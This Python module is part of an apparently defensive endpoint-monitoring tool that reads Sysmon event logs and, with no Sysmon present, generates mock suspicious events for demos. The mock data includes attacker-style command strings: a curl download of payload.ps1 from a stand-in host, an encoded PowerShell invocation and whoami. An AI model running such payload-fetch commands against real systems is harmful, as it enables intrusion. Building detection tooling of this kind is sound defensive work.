"""
Sysmon Event Collector.
Collects process creation, network connection, DLL load, and file creation events from Sysmon.
Includes a mock fallback if Sysmon is not installed.
"""

import asyncio
import logging
from datetime import datetime, timezone
import socket

# Try to import pywin32
try:
    import win32evtlog
    import win32evtlogutil
    HAS_PYWIN32 = True
except ImportError:
    HAS_PYWIN32 = False

from ..database import insert_event, insert_process
from ..event_bus import event_bus

logger = logging.getLogger(__name__)

async def process_normalized_event(event: dict):
    """Save to DB, handle process creation specially, and publish to event bus."""
    await insert_event(event)
    
    # If Event 1 (Process Creation), insert process
    if event["event_id"] == 1:
        proc_data = {
            "pid": event["pid"],
            "ppid": event["ppid"],
            "image": event["image"],
            "commandline": event["commandline"],
            "username": event["username"],
            "timestamp": event["timestamp"],
            "status": "running"
        }
        await insert_process(proc_data)
        
    await event_bus.publish("events", event)

async def run_mock_sysmon():
    """Generates mock Sysmon events for fallback and demo purposes."""
    logger.info("Running Sysmon Collector in Mock Fallback mode.")
    import random
    
    processes = [
        ("cmd.exe", "cmd.exe /c whoami", "SYSTEM"),
        ("powershell.exe", "powershell.exe -NoProfile -EncodedCommand BASE64...", "Administrator"),
        ("svchost.exe", "svchost.exe -k netsvcs", "SYSTEM"),
        ("explorer.exe", "C:\\Windows\\explorer.exe", "thisuser"),
        ("curl.exe", "curl -s http://example.com/payload.ps1", "thisuser")
    ]
    
    ips = ["192.168.1.50", "10.0.0.12", "8.8.8.8", "185.190.140.10"]
    dlls = ["kernel32.dll", "ntdll.dll", "user32.dll", "ws2_32.dll", "wldap32.dll"]
    files = ["C:\\Users\\thisuser\\Downloads\\invoice.pdf.exe", "C:\\Windows\\Temp\\temp.tmp", "C:\\Users\\thisuser\\AppData\\Roaming\\payload.dll"]
    
    while True:
        try:
            await asyncio.sleep(random.uniform(5.0, 12.0))
            
            event_id = random.choice([1, 3, 7, 11])
            pid = random.randint(1000, 20000)
            ppid = random.randint(500, 1000)
            
            # Select process context
            proc_name, cmd, user = random.choice(processes)
            image = f"C:\\Windows\\System32\\{proc_name}"
            
            event = {
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "source": "sysmon",
                "event_id": event_id,
                "severity": "low" if event_id in [7, 11] else "medium",
                "pid": pid,
                "ppid": ppid,
                "image": image,
                "commandline": cmd,
                "username": user,
                "host": socket.gethostname(),
                "raw_data": {}
            }
            
            if event_id == 1:
                event["raw_data"] = {
                    "RuleName": "ProcessCreate",
                    "OriginalFileName": proc_name,
                    "CurrentDirectory": "C:\\Windows\\system32"
                }
            elif event_id == 3:
                event["raw_data"] = {
                    "RuleName": "NetworkConnect",
                    "Protocol": "tcp",
                    "Initiated": "true",
                    "SourceIp": "192.168.1.15",
                    "SourcePort": random.randint(49152, 65535),
                    "DestinationIp": random.choice(ips),
                    "DestinationPort": random.choice([80, 443, 8080, 4444])
                }
            elif event_id == 7:
                event["raw_data"] = {
                    "RuleName": "ImageLoad",
                    "ImageLoaded": random.choice(dlls),
                    "Signature": "Microsoft Windows",
                    "Signed": "true"
                }
            elif event_id == 11:
                event["raw_data"] = {
                    "RuleName": "FileCreate",
                    "TargetFilename": random.choice(files),
                    "CreationUtcTime": datetime.now(timezone.utc).isoformat()
                }
                
            await process_normalized_event(event)
        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Error in mock Sysmon collector: {e}")

async def run_real_sysmon():
    """Polls real Microsoft-Windows-Sysmon/Operational logs."""
    logger.info("Checking for Sysmon installation...")
    try:
        hand = win32evtlog.OpenEventLog(None, "Microsoft-Windows-Sysmon/Operational")
    except Exception as e:
        logger.warning(f"Sysmon event log not found or access denied: {e}. Switching to mock fallback.")
        await run_mock_sysmon()
        return
        
    flags = win32evtlog.EVENTLOG_FORWARDS_READ | win32evtlog.EVENTLOG_SEQUENTIAL_READ
    
    # Discard existing events on startup
    discard_flags = win32evtlog.EVENTLOG_BACKWARDS_READ | win32evtlog.EVENTLOG_SEQUENTIAL_READ
    win32evtlog.ReadEventLog(hand, discard_flags, 0)
    
    logger.info("Sysmon Collector is actively listening for Sysmon events.")
    
    while True:
        try:
            await asyncio.sleep(2.0)
            events = win32evtlog.ReadEventLog(hand, flags, 0)
            if not events:
                continue
                
            for ev in events:
                event_id = ev.EventID & 0xFFFF
                if event_id in [1, 3, 7, 11]:
                    strings = ev.StringInserts
                    # Parse Event context based on strings array
                    # Note: Sysmon strings inside ev.StringInserts are index-based.
                    # Since it is complex and XML based, we extract best-effort indexes:
                    image = strings[4] if len(strings) > 4 else ""
                    cmd = strings[10] if len(strings) > 10 else ""
                    user = strings[12] if len(strings) > 12 else "SYSTEM"
                    
                    pid = None
                    ppid = None
                    try:
                        pid = int(strings[3]) if len(strings) > 3 else None
                        ppid = int(strings[8]) if len(strings) > 8 else None
                    except:
                        pass
                        
                    raw_data = {"inserts": strings}
                    if event_id == 3:
                        raw_data["SourceIp"] = strings[9] if len(strings) > 9 else ""
                        raw_data["DestinationIp"] = strings[14] if len(strings) > 14 else ""
                        raw_data["Protocol"] = strings[7] if len(strings) > 7 else "tcp"
                        
                    normalized = {
                        "timestamp": ev.TimeGenerated.replace(tzinfo=timezone.utc).isoformat() if ev.TimeGenerated else datetime.now(timezone.utc).isoformat(),
                        "source": "sysmon",
                        "event_id": event_id,
                        "severity": "low" if event_id in [7, 11] else "medium",
                        "pid": pid,
                        "ppid": ppid,
                        "image": image,
                        "commandline": cmd,
                        "username": user,
                        "host": socket.gethostname(),
                        "raw_data": raw_data
                    }
                    await process_normalized_event(normalized)
        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Error in Sysmon collector loop: {e}")
            await asyncio.sleep(5.0)

async def start_sysmon_collector():
    """Starts the Sysmon event collector."""
    logger.info("Initializing Sysmon Collector...")
    if HAS_PYWIN32:
        asyncio.create_task(run_real_sysmon())
    else:
        logger.warning("pywin32 not available. Running mock Sysmon collector instead.")
        asyncio.create_task(run_mock_sysmon())
